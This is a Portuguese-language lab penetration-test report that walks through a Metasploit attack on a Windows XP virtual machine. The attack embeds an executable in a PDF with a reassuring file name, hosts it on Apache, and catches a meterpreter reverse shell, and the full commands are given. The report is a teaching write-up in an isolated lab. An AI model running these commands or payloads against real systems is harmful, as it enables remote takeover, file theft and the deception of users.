<h1 style="border-bottom: 2px solid #333; padding-bottom: 10px;">RELATÓRIO TÉCNICO: PENTEST INTERNO (LAB)</h1>

<p><strong>NÍVEL: CONFIDENCIAL</strong><br>
<strong>Data:</strong> 19 de Novembro de 2025<br>
<strong>Analistas:</strong> Yuri Alexander e Gabriel Machado<br>
<strong>Cenário:</strong> Ataque de Engenharia Social em ambiente virtualizado.</p>

<hr style="border: 0; border-top: 2px solid #000; margin: 30px 0;">

<h2 style="background-color: #333; color: #fff; padding: 10px;">TRABALHO 1: VETOR DE ATAQUE VIA PDF (DOCUMENTAÇÃO)</h2>

<h3>1.1. O CENÁRIO DO ATAQUE</h3>
<p>Nesta etapa, nosso objetivo foi comprometer a máquina alvo (<strong>Windows XP</strong>) sem precisar atacar diretamente o sistema operacional. A estratégia foi explorar o "fator humano". Criamos um arquivo PDF legítimo, mas que carrega um executável oculto, abusando de uma falha de design no Adobe Reader 9.3.</p>

<ul>
    <li><strong>Atacante:</strong> Kali Linux (IP 192.168.20.2)</li>
    <li><strong>Vítima:</strong> Windows XP SP3</li>
    <li><strong>Ferramenta:</strong> Metasploit Framework</li>
</ul>

<h3>1.2. PASSO A PASSO DA INVASÃO</h3>

<h4>Passo 1: Escolha do Exploit</h4>
<p>No Kali Linux, acessamos o Metasploit e carregamos o módulo específico que permite "embutir" um binário dentro de um PDF.</p>

<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
<code>msf > use exploit/windows/fileformat/adobe_pdf_embedded_exe</code>
</pre>

<h4>Passo 2: Configurando o "Gatilho" (Payload)</h4>
<p>Aqui definimos como o Windows XP vai se conectar de volta para nós. Usamos um <em>Reverse TCP</em> e demos um nome amigável ao arquivo ("ArquivoConfiavel") para enganar o usuário.</p>

<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
<code>msf exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(...) > set LHOST 192.168.20.2
msf exploit(...) > set LPORT 4444
msf exploit(...) > set INFILENAME ArquivoConfiavel.pdf</code>
</pre>

<blockquote style="background-color:#eee; padding:10px; border-left: 5px solid #d9534f;">
<strong>NOTA DE CAMPO (TROUBLESHOOTING):</strong><br>
Tivemos um problema na primeira tentativa. A conexão não subia porque o exploit estava pegando um IP errado por padrão. Conferimos nossa interface de rede (<em>Wired Connection 1</em>), vimos que o IP correto do Kali era <code>192.168.20.2</code> e setamos manualmente o <code>LHOST</code>. Isso resolveu o problema.
</blockquote>

<p><strong>Gerando o Arquivo Malicioso:</strong></p>
<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
<code>msf exploit(...) > exploit
# [+] Arquivo criado em: /root/.msf4/local/ArquivoConfiavel.pdf</code>
</pre>

<h4>Passo 3: Servidor de Entrega (Apache)</h4>
<p>Para o ataque funcionar, o Windows XP precisa baixar esse arquivo. Em vez de tentar enviar por email, levantamos o servidor Web Apache no próprio Kali e movemos o arquivo para a pasta pública.</p>

<p><strong>Comandos executados no Kali:</strong></p>
<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
<code># service apache2 start
# cp /root/.msf4/local/ArquivoConfiavel.pdf /var/www/html/</code>
</pre>

<h4>Passo 4: Preparando a Armadilha (Listener)</h4>
<p>Deixamos o Kali "ouvindo" a porta 4444. Assim que a vítima abrir o PDF, a conexão cai aqui.</p>

<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
<code>msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.20.2
msf exploit(handler) > exploit</code>
</pre>

<h4>Passo 5: O Comprometimento</h4>
<p>Na máquina Windows XP, assim que o arquivo foi executado e o aviso de segurança aceito, ganhamos acesso total via terminal:</p>

<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
<code>meterpreter > screenshot  (Captura a tela do XP)
meterpreter > shell       (Abre o CMD do XP)
C:\Documents and Settings\Administrator\Desktop></code>
</pre>

<br>
<hr style="border: 0; border-top: 2px solid #000; margin: 30px 0;">
<br>

<h2 style="background-color: #333; color: #fff; padding: 10px;">TRABALHO 2: EXECUÇÃO DO PAYLOAD .EXE (PROVA DE CONCEITO)</h2>

<h3>2.1. O QUE ESTÁ SENDO MOSTRADO?</h3>
<p>Nesta seção, apresentamos a evidência visual do ataque acontecendo em tempo real. Diferente do PDF, aqui focamos na execução direta do binário (arquivo .exe) na máquina Windows XP e na resposta imediata do nosso servidor de ataque no Kali.</p>

<h3>2.2. ASSISTA À DEMONSTRAÇÃO</h3>

<div align="center" style="margin-bottom: 20px; background-color: #f9f9f9; padding: 15px; border: 1px solid #ccc;">
    <p><strong>CLIQUE NA IMAGEM PARA VER O VÍDEO:</strong></p>
    <a href="https://youtu.be/lntV_v_hTH0" target="_blank">
        <img src="https://img.youtube.com/vi/lntV_v_hTH0/hqdefault.jpg" 
             alt="Assistir Vídeo no YouTube" 
             style="width:100%; max-width:600px; border: 2px solid #333; box-shadow: 0 0 10px rgba(0,0,0,0.3);">
    </a>
    <p style="margin-top:10px;">🔴 <strong><a href="https://youtu.be/lntV_v_hTH0">Abrir no YouTube</a></strong></p>
</div>

<p><i>Se preferir, acesse o arquivo local (video.mp4):</i></p>
<div style="background-color:#000; text-align:center; padding:10px;">
    <video width="100%" height="auto" controls>
        <source src="video.mp4" type="video/mp4">
        Seu navegador não suporta a tag de vídeo.
    </video>
</div>

<h3>2.3. ANÁLISE DO VÍDEO</h3>
<p>Pontos importantes que podem ser observados na gravação:</p>
<ol>
    <li><strong>Transferência:</strong> O usuário no Windows XP baixa o arquivo hospedado no Kali.</li>
    <li><strong>Execução Manual:</strong> A vítima clica no executável. Note que o sistema não impede a execução.</li>
    <li><strong>Conexão Reversa:</strong> No exato momento do clique, o terminal do Kali Linux exibe <code>Meterpreter session 1 opened</code>.</li>
    <li><strong>Controle Total:</strong> Isso prova que o Windows XP foi completamente invadido, permitindo roubo de arquivos, captura de tela e execução de comandos remotos.</li>
</ol>

<hr>

<h3>3. CONCLUSÃO</h3>
<p>O laboratório foi um sucesso. Conseguimos demonstrar como sistemas antigos (Windows XP) e softwares desatualizados (Adobe Reader) são portas abertas para invasores. Com uma configuração simples de rede e um pouco de engenharia social, obtivemos controle administrativo da máquina alvo.</p>
